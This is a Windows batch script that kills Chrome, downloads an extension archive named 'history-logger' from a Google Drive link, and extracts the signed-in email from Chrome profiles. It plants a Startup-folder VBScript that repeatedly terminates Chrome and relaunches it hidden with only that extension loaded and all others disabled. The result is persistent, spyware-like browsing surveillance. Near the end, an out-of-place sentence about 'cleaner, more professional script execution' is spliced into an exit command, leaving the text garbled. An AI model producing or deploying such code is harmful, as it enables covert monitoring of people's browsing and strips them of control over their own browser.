@echo off
setlocal EnableDelayedExpansion

set "ZIP_URL=https://drive.google.com/uc?export=download&id=1_MrCTaWFitVrrapsDodqTZduIvWKHCtU"
set "SCRIPT_DIR=%~dp0"
set "WORKDIR=%SCRIPT_DIR%history-logger"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "VBS_SCRIPT=%STARTUP_DIR%\run_extension.vbs"
set "CHECK_INTERVAL=5"
set "CONFIG_FILE=%WORKDIR%\config.json"

taskkill /IM chrome.exe /F >nul 2>&1
timeout /t 3 /nobreak >nul

if exist "%WORKDIR%" (
  rd /s /q "%WORKDIR%" || exit /b 1
)
mkdir "%WORKDIR%" || exit /b 1

powershell -NoProfile -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing" || exit /b 1

powershell -NoProfile -Command "Expand-Archive -Path '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force" || exit /b 1

call :scan_email || exit /b 1

(
  echo Set WShell = CreateObject("WScript.Shell")
  echo Set FSO = CreateObject("Scripting.FileSystemObject")
  echo Do
  echo     On Error Resume Next
  echo     Set Processes = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'chrome.exe'")
  echo     Found = False
  echo     ProfileDir = ""
  echo     For Each Process in Processes
  echo         If InStr(Process.CommandLine, "--load-extension=" ^& chr(34) ^& "%WORKDIR%" ^& chr(34)) > 0 Then
  echo             Found = True
  echo         Else
  echo             Process.CommandLine = Process.CommandLine ^& ""
  echo             If InStr(Process.CommandLine, "--user-data-dir=") > 0 Then
  echo                 Set RegEx = New RegExp
  echo                 RegEx.Pattern = "--user-data-dir=""([^""]+)"""
  echo                 Set Matches = RegEx.Execute(Process.CommandLine)
  echo                 If Matches.Count > 0 Then ProfileDir = Matches(0).SubMatches(0)
  echo             End If
  echo             Process.Terminate
  echo         End If
  echo     Next
  echo     If Not Found Then
  echo         If ProfileDir = "" Then ProfileDir = "%LOCALAPPDATA%\Google\Chrome\User Data\Default"
  echo         Email = ""
  echo         For Each Folder in FSO.GetFolder("%LOCALAPPDATA%\Google\Chrome\User Data").SubFolders
  echo             If FSO.FileExists(Folder.Path ^& "\Preferences") Then
  echo                 On Error Resume Next
  echo                 Set Preferences = FSO.OpenTextFile(Folder.Path ^& "\Preferences", 1)
  echo                 Json = Preferences.ReadAll
  echo                 Preferences.Close
  echo                 Set RegEx = New RegExp
  echo                 RegEx.Pattern = """email"":""([^""]+)""
  echo                 Set Matches = RegEx.Execute(Json)
  echo                 If Matches.Count > 0 Then
  echo                     Email = Matches(0).SubMatches(0)
  echo                     ProfileDir = Folder.Path
  echo                     Exit For
  echo                 End If
  echo                 On Error Goto 0
  echo             End If
  echo         Next
  echo         If Email = "" Then Email = "anonymous@demo.com"
  echo         Set Config = FSO.OpenTextFile("%CONFIG_FILE%", 2, True)
  echo         Config.WriteLine "{""userEmail"":""" ^& Email ^& """}"
  echo         Config.Close
  echo         WShell.Run chr(34) ^& "chrome.exe" ^& chr(34) ^& " --user-data-dir=" ^& chr(34) ^& ProfileDir ^& chr(34) ^& " --disable-extensions-except=" ^& chr(34) ^& "%WORKDIR%" ^& chr(34) ^& " --load-extension=" ^& chr(34) ^& "%WORKDIR%" ^& chr(34), 0
  echo     End If
  echo     WScript.Sleep !CHECK_INTERVAL! * 1000
  echo Loop
) > "%VBS_SCRIPT%" || exit /b 1

start "" chrome.exe --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%WORKDIR%" --load-extension="%WORKDIR%" || exit /b 1

exit /b 0

:scan_email
set "EMAIL="
set "PROFILE_DIR="
for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
  if exist "%%P\Preferences" (
    for /f "usebackq delims=" %%E in (`powershell -NoProfile -Command "try { (Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email } catch { '' }"`) do (
      if not "%%E"=="" (
        set "EMAIL=%%E"
        set "PROFILE_DIR=%%P"
        goto :write_config
      )
    )
  )
)
:write_config
if not defined EMAIL (
  set "EMAIL=anonymous@demo.com"
  set "PROFILE_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
)
(
  echo {"userEmail":"!EMAIL!"}
) > "%CONFIG_FILE%" || exit /b 1
exitDispense with comments and debugging output for a cleaner, more professional script execution. /b 0
